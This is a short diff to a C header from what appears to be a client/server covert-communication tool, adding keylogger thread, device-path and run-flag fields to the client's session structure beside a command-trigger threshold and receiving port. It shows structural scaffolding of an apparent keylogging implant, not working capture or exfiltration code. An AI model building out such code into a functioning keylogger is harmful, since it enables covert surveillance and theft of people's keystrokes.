@@ -4,6 +4,9 @@
 #include <stddef.h>
 #include <stdint.h>
 #include <stdbool.h>
+#ifdef CLIENT_BUILD
+#include <pthread.h>
+#endif
 
 #define COMMAND_TRIGGER_THRESHOLD 2
 #define RECEIVING_PORT 8080
@@ -39,6 +42,9 @@ struct packet_data {
 struct session_info {
 #ifdef CLIENT_BUILD
     struct client_options * client_options_;
+    _Atomic int * run_keylogger;
+    char * device_path;
+    pthread_t keylogger_thread;
 #endif
 #ifdef CENTRAL_BUILD
     struct server_options * server_options_;
@@ -50,7 +56,6 @@ struct session_info {
     int packet_counter;
     int data_counter;
 
-    _Atomic bool run_keylogger;
 };
 
 // Function typedef
